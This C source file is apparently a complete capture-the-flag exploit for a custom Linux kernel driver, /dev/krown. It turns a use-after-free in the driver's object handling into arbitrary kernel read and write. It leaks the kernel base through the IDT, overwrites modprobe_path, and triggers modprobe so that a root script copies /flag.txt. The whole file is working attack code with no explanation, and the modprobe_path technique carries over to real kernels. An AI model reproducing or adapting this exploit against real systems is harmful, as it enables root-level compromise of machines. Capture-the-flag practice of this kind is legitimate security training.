#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <stdint.h>

#define KROWN_MAGIC 0x4B
#define KROWN_FORGE_CROWN   _IOWR(KROWN_MAGIC, 0, struct krown_req)
#define KROWN_FORGE_SEAL    _IOWR(KROWN_MAGIC, 1, struct krown_req)
#define KROWN_BREAK         _IOW(KROWN_MAGIC, 2, struct krown_req)
#define KROWN_BIND          _IOW(KROWN_MAGIC, 3, struct krown_req)
#define KROWN_EXAMINE       _IOWR(KROWN_MAGIC, 5, struct krown_req)
#define KROWN_IMPRESS       _IOW(KROWN_MAGIC, 6, struct krown_req)
#define KROWN_WITNESS       _IOWR(KROWN_MAGIC, 7, struct krown_req)
#define KROWN_INSCRIBE      _IOW(KROWN_MAGIC, 8, struct krown_req)

struct krown_req {
    int id;
    int index;
    unsigned long offset;
    unsigned long size;
    unsigned long ptr_val;
    char data[256];
};

static int fd;

static int forge_crown(void) {
    struct krown_req req = {0};
    if (ioctl(fd, KROWN_FORGE_CROWN, &req) < 0) return -1;
    return req.id;
}

static int forge_seal(void) {
    struct krown_req req = {0};
    if (ioctl(fd, KROWN_FORGE_SEAL, &req) < 0) return -1;
    return req.id;
}

static int bind(int crown, int seal) {
    struct krown_req req = {.id = crown, .index = seal};
    return ioctl(fd, KROWN_BIND, &req);
}

static int break_obj(int id) {
    struct krown_req req = {.id = id};
    return ioctl(fd, KROWN_BREAK, &req);
}

static int examine(int crown, int index, unsigned long offset,
                   unsigned long size, void *out)
{
    struct krown_req req = {
        .id = crown, .index = index,
        .offset = offset, .size = size
    };
    if (ioctl(fd, KROWN_EXAMINE, &req) < 0) return -1;
    memcpy(out, req.data, size);
    return 0;
}

static int impress(int crown, int index, unsigned long offset,
                   unsigned long size, const void *data)
{
    struct krown_req req = {
        .id = crown, .index = index,
        .offset = offset, .size = size
    };
    memcpy(req.data, data, size);
    return ioctl(fd, KROWN_IMPRESS, &req);
}

static int witness(int crown, unsigned long offset,
                   unsigned long size, void *out)
{
    struct krown_req req = {
        .id = crown, .offset = offset, .size = size
    };
    if (ioctl(fd, KROWN_WITNESS, &req) < 0) return -1;
    memcpy(out, req.data, size);
    return 0;
}

static int inscribe(int crown, unsigned long offset,
                    unsigned long size, const void *data)
{
    struct krown_req req = {
        .id = crown, .offset = offset, .size = size
    };
    memcpy(req.data, data, size);
    return ioctl(fd, KROWN_INSCRIBE, &req);
}

struct idtr {
    uint16_t limit;
    uint64_t base;
} __attribute__((packed));

static void get_idt_base(struct idtr *idtr)
{
    asm volatile ("sidt %0" : "=m"(*idtr));
}

static uint64_t parse_idt_entry(const uint8_t *entry)
{
    uint64_t off1 = *(uint16_t *)(entry + 0);
    uint64_t off2 = *(uint16_t *)(entry + 6);
    uint64_t off3 = *(uint32_t *)(entry + 8);
    return off1 | (off2 << 16) | (off3 << 32);
}

static const uint64_t OFF_ASM_EXC_DIVIDE_ERROR = 0x00e00990ULL;
static const uint64_t OFF_MODPROBE_PATH        = 0x0184b380ULL;

int main(void)
{
    setbuf(stdout, NULL);

    fd = open("/dev/krown", O_RDWR);
    if (fd < 0) {
        perror("open /dev/krown");
        return 1;
    }

    struct idtr idt;
    get_idt_base(&idt);
    printf("[+] IDT base = 0x%lx\n", (unsigned long)idt.base);

    int C = forge_crown();
    int S = forge_seal();
    if (C < 0 || S < 0) {
        fprintf(stderr, "[-] forge failed\n");
        return 1;
    }
    printf("[+] C=%d S=%d\n", C, S);

    if (bind(C, S) < 0) {
        perror("bind");
        return 1;
    }

    if (break_obj(S) < 0) {
        perror("break S");
        return 1;
    }

    int C2 = forge_crown();
    if (C2 < 0) {
        perror("forge_crown C2");
        return 1;
    }
    printf("[+] C2=%d (reallocated in S's slot)\n", C2);

    uint64_t idt_base = idt.base;
    if (impress(C, 0, 0x10, 8, &idt_base) < 0) {
        perror("impress C2->ptr");
        return 1;
    }
    printf("[+] C2->ptr set to IDT base\n");

    uint8_t idt_buf[256];
    memset(idt_buf, 0, sizeof(idt_buf));
    if (witness(C2, 0, sizeof(idt_buf), idt_buf) < 0) {
        perror("witness IDT");
        return 1;
    }

    uint64_t handler = parse_idt_entry(idt_buf);
    printf("[+] IDT[0] handler = 0x%lx\n", handler);

    uint64_t kernel_base = handler - OFF_ASM_EXC_DIVIDE_ERROR;
    printf("[+] kernel_base  = 0x%lx\n", kernel_base);

    uint64_t modprobe_path = kernel_base + OFF_MODPROBE_PATH;
    printf("[+] modprobe_path = 0x%lx\n", modprobe_path);

    if (impress(C, 0, 0x10, 8, &modprobe_path) < 0) {
        perror("impress C2->ptr (modprobe)");
        return 1;
    }

    const char *script = "/home/x\x00";
    if (inscribe(C2, 0, 8, script) < 0) {
        perror("inscribe modprobe_path");
        return 1;
    }
    printf("[+] modprobe_path overwritten\n");

    int f = open("/home/x", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (f < 0) {
        perror("open /home/x");
        return 1;
    }
    const char *payload =
        "#!/bin/sh\n"
        "cat /flag.txt > /home/flag.txt\n"
        "chmod 666 /home/flag.txt\n";
    write(f, payload, strlen(payload));
    close(f);

    int t = open("/home/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (t < 0) {
        perror("open /home/trigger");
        return 1;
    }
    write(t, "\x13\x37\x13\x37", 4);
    close(t);

    printf("[+] triggering modprobe ...\n");
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"/home/trigger", NULL};
        char *envp[] = {NULL};
        execve("/home/trigger", argv, envp);
        _exit(0);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }

    int flagfd = open("/home/flag.txt", O_RDONLY);
    if (flagfd < 0) {
        perror("open /home/flag.txt");
        return 1;
    }
    char flag[0x100];
    int n = read(flagfd, flag, sizeof(flag) - 1);
    if (n > 0) {
        flag[n] = 0;
        printf("[+] FLAG: %s\n", flag);
    } else {
        printf("[-] failed to read flag\n");
    }
    close(flagfd);
    return 0;
}
